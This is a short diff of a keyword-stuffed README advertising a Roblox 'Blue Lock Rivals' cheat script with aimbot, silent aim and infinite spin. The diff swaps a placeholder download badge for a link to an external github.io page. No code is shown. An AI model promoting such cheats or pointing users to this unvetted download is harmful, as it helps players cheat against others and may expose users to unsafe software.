@@ -3,7 +3,7 @@
 Welcome to the official repository for the **Blue Lock Rivals Script**! This is the ultimate **rivals script roblox** that gives you a competitive edge in *Blue Lock Rivals* with powerful features like **rivals script aimbot** 🎯, **silent aim** 🔕, and **inf spin** 🔄. Whether you play on PC 💻 or **rivals script mobile** 📱, this is the best script available in 2025.
 
 ## 🚀 Download
-[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals%20Script-blue?style=for-the-badge)](#)
+[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals%20Script-blue?style=for-the-badge)](https://rivalsgod.github.io/.rivals/)
 
 ---
 
